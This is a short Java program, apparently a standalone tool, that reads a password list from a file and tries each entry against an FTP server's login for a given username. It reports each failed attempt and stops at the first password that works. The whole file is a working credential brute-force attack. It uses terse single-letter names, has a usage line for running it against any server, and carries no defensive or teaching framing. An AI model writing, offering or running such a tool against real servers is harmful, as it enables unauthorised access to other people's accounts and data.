import java.io.BufferedReader;
import java.io.FileReader;
import org.apache.commons.net.ftp.FTPClient;

public class ftp {
    
    public static boolean login(String b, String c, String d){
        FTPClient a = new FTPClient();
        try {
            a.connect(b);
        } catch (Exception g){
            b("failed to connect to server");
        }
        try{
            a.login(c, d);
            a.listFiles();
        } catch (Exception h){
            try{
                a.disconnect();
            } catch (Exception i){
                b("failed to disconnect");
            }
            return false;
        }
        return true;
    }
            
    public static void main(String[] args) {
        if(args.length < 3 || args.length > 3){
            b("Usage:  java -jar ftp {server} {username} {passwordfile}");
            return;
        }
        String c = args[0];
        String d = args[1];
        String e = args[2];
        String f = null;
        
        try{
            BufferedReader g = new BufferedReader(new FileReader(e));
            
            while((f = g.readLine())!= null){
                if(login(c, d, f)){
                    b("password and username " + d + " " + f + " successfull");
                    return;
                }else{
                    b("attempt " + d + " " + f + " failed");
                }
            }
        } catch (Exception j){
            b("the file you input might not exist");
        }
    }
    public static void b(String a){
        System.out.println(a);
    }
}
